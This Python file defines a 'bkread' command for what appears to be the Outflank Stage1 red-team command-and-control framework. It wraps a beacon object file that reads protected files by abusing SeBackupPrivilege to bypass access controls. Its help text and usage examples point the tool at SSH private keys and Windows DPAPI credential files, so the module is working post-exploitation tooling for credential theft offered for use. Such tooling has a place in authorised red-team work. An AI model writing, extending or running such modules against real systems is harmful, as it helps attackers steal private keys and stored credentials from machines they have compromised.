from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class BkreadBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("bkread", base_binary_name="bkread")

        self.parser.description = (
            "Read a file with SeBackupPrivilege and FILE_FLAG_BACKUP_SEMANTICS. "
            "Useful when SYSTEM or another privileged token is blocked by the file DACL."
        )

        self.parser.add_argument(
            "path",
            help="Target file path to read, e.g., C:\\Users\\alice\\.ssh\\id_rsa"
        )

        self.parser.add_argument(
            "--max-bytes",
            "-m",
            type=int,
            default=1048576,
            metavar="BYTES",
            help="Maximum bytes to stream. Default: 1048576 (1 MB), hard limit: 16777216 (16 MB)"
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  bkread C:\\Users\\alice\\.ssh\\id_ed25519\n"
            "  bkread C:\\Users\\alice\\.ssh\\id_rsa --max-bytes 8192\n"
            "  bkread \"C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Credentials\\file\" -m 65536\n\n"
            "Notes:\n"
            "  - Read-only BOF: does not change ownership or ACLs\n"
            "  - Requires a token that holds SeBackupPrivilege\n"
            "  - Opens the file with FILE_FLAG_BACKUP_SEMANTICS\n"
            "  - Intended for known file paths; directory listing is not implemented in this BOF\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)

        parser_arguments = self.parser.parse_args(arguments)

        if not parser_arguments.path or parser_arguments.path.strip() == "":
            raise TaskInvalidArgumentsException("Path cannot be empty")

        if parser_arguments.max_bytes < 1 or parser_arguments.max_bytes > 16777216:
            raise TaskInvalidArgumentsException(
                "Invalid max-bytes value. Allowed range: 1-16777216."
            )

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)
        path = parser_arguments.path.strip('"').strip("'")

        return [
            (BOFArgumentEncoding.WSTR, path),
            (BOFArgumentEncoding.INT, parser_arguments.max_bytes),
        ]
